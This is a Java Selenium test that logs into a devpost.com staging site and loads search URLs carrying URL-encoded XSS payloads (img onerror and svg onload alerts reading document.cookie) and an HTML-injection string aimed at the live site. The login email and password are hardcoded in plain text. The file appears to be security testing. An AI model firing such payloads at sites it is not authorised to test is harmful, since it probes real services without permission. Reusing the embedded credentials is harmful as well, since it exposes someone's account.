package xsstestCPStaging;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import java.util.concurrent.TimeUnit;
import org.junit.After;
import org.junit.AfterClass;
import org.junit.Before;
import org.junit.BeforeClass;
import org.junit.Test;


public class XSS {

	
	private WebDriver driver;
	
	@Before
	public void setUp() throws Exception {
		
		System.setProperty("webdriver.chrome.driver", "/Users/jchubacca/Documents/workspace/Webdriver/chromedriver");
	    ChromeOptions options = new ChromeOptions(); 
	    options.addArguments("user-data-dir=/Users/jchubacca/Library/Application Support/Google/Chrome/SeleniumProfile");
 		driver = new ChromeDriver(options);
		driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);
	
	}

	@After
	public void tearDown() throws Exception {
		   driver.quit();
		   
	}

	@Test
	public void test() {
		
			driver.get("http://staging.devpost.com/opensesame/github");
			waitforelements(3000);
			driver.findElement(By.linkText("Log in")).click();
			
			waitforelements(2000);
			
			
			
			driver.findElement(By.id("user_email")).sendKeys("jonathan.chu.cp@gmail.com");
			driver.findElement(By.id("user_password")).sendKeys("challenge2015");
			driver.findElement(By.id("submit-form")).click();
			System.out.println("Email - Logging In Successfully on FF"); 
		
			waitforelements(2000);
			
			driver.get("http://staging.devpost.com/software/search?query=%22%3E%3Cimg%20src=%22x%22%20onerror=%22alert%28document.cookie%29%22%3E");
			
			waitforelements(2000);
			
			driver.get("http://staging.devpost.com/software/search?query=%22%3E%3Cimg%20src=x%20onerror=%22alert%28document.cookie%29%22%3E");
			
			waitforelements(2000);
			
			driver.get("http://staging.devpost.com/software/search?query=%22/%3E%3Csvg/onload=alert%281%29%3E");
			
			waitforelements(2000);
			
			driver.get("http://devpost.com/software/search?query=%22%22%3E%3Ch1%3Euh%20oh...%3C/h1%3E"); 
 
			System.out.println("XSS and HTML Injection test Completed!");
		  	   
		
		}		
	



		private void waitforelements(int time) {
		
		try {
			Thread.sleep(time);
		}
		catch(InterruptedException ie){
			
		}
		
		
	}
	
}
